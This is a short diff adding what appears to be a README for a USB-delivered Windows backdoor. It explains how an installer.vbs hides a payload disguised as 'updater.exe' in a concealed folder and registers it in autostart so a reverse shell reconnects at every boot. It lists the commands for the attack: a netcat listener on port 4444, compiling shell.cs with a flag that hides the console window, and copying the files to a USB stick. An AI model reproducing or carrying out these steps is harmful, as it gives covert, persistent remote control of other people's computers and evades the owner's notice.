@@ -1,0 +1,15 @@
+when usb is in target run the installer.vbs to add the payload(updater.exe) to a hard to find folder called windows~ . The installer will also
+add the payload to the autostart registry meaning everytime the target machine is started a call to the listener is made.
+
+the updater exe(shell.cs) file is re run every time the computer is started meaning if there is a listener the shell will be restored every target machine start.
+ because its put in the starup registry in windows
+
+Debian commands
+
+nc -lvnp 4444 # to create a listener which when the exe is run on the target will become the reverse shell on host  
+
+mcs -target:winexe shell.cs -out:updater.exe   #important to turn it into an exe with the "target:winexe" part this avoids a visble cmd being created
+
+cp install.vbs /media/ep/6197-1B82/  #this just sends it to a usb, will not work on your pc 
+
+cp updater.exe /media/ep/6197-1B82/
